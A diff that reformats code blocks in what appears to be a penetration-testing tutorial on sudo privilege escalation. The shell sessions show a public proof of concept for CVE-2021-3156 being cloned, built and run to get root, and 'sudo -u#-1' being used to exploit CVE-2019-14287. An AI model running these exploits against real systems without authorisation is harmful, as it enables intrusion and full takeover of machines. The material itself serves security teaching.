@@ -4,8 +4,7 @@
 
 The program `sudo` is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to administrators. It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
 [sudo] password for cry0l1t3:  **********
 
@@ -29,8 +28,7 @@ One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is ba
 
 To find out the version of `sudo`, the following command is sufficient:
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ sudo -V | head -n1
 
 Sudo version 1.8.31
@@ -38,8 +36,7 @@ Sudo version 1.8.31
 
 The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used for this. We can either download this to a copy of the target system we have created or, if we have an internet connection, to the target system itself.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
 cry0l1t3@nix02:~$ cd CVE-2021-3156
 cry0l1t3@nix02:~$ make
@@ -52,8 +49,7 @@ gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
 
 When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich
 
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
@@ -73,8 +69,7 @@ cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich
 
 We can find out which version of the operating system we are dealing with using the following command:
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ cat /etc/lsb-release
 
 DISTRIB_ID=Ubuntu
@@ -85,8 +80,7 @@ DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
 
 Next, we specify the respective ID for the version operating system and run the exploit with our payload.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1
 
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
@@ -105,8 +99,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ sudo -l
 [sudo] password for cry0l1t3: **********
 
@@ -116,8 +109,7 @@ User cry0l1t3 may run the following commands on Penny:
 
 In fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3
 
 cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
@@ -125,8 +117,7 @@ cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
 
 Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ sudo -u#-1 id
 
 root@nix02:/home/cry0l1t3# id
